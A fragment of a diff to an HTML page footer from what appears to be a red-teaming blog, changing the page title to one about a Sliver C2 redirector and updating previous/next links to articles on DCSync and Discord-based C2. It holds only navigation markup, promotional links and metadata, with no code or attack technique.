+<p>Thanks for staying to the end. If this post was useful, smash the subscribe on the <a href="https://www.youtube.com/@lsecqt">YouTube channel</a>, and if you want to go deeper into the malware and red teaming side, support the work on <a href="https://www.patreon.com/Lsecqt">Patreon</a> where the internal videos, custom agent and packer live. Have fun out there.</p>
 
                 
                 <!-- Required only on API pages -->
@@ -482,20 +433,20 @@ int main()
             
                 <nav id="retype-nextprev" class="print:hidden flex mt-14">
                     <div class="w-1/2">
-                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../malware-development/malware-development-with-c-basic-persistence/">
+                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../active-directory/you-dont-need-mimikatz-for-dcsync-anymore-(sharpdcsync)/">
                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                             <span>
                                 <span class="block text-xs font-normal text-base-text-muted">Previous</span>
-                                <span class="block mt-1">Malware Development with C - Establishing Persistence</span>
+                                <span class="block mt-1">You Don&#39;t Need Mimikatz for DC​Sync Anymore (Sharp​DC​Sync)</span>
                             </span>
                         </a>
                     </div>
             
                     <div class="w-1/2">
-                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../malware-development/the-most-powerful-malware-analysis-tool-you-need-in-2025/">
+                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../c2/utilizing-discord-as-c2-traffic-broker/">
                             <span>
                                 <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
-                                <span class="block mt-1">The Most Powerful Malware Analysis Tool You NEED in 2025</span>
+                                <span class="block mt-1">Utilizing Discord as C​2 Traffic Broker</span>
                             </span>
                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                         </a>
@@ -539,6 +490,6 @@ int main()
 
     <div id="retype-overlay-target"></div>
 
-        <script data-cfasync="false">window.__DOCS__ = { "title": "Staging vs Stageless payloads - Which one is Better?", level: 2, icon: "file", hasPrism: true, hasInstagram: false, hasMermaid: false, hasMath: false, tocDepth: 23, "md": "/malware-development/staging-vs-stageless-payloads-what-is-better/staging-vs-stageless-payloads-what-is-better.md" }</script>
+        <script data-cfasync="false">window.__DOCS__ = { "title": "Bypassing Egress Firewalls with a Sliver C2 Redirector", level: 2, icon: "file", hasPrism: false, hasInstagram: false, hasMermaid: false, hasMath: false, tocDepth: 23, "md": "/c2/bypassing-egress-firewalls-with-a-sliver-c2-redirector/bypassing-egress-firewalls-with-a-sliver-c2-redirector.md" }</script>
 </body>
 </html>
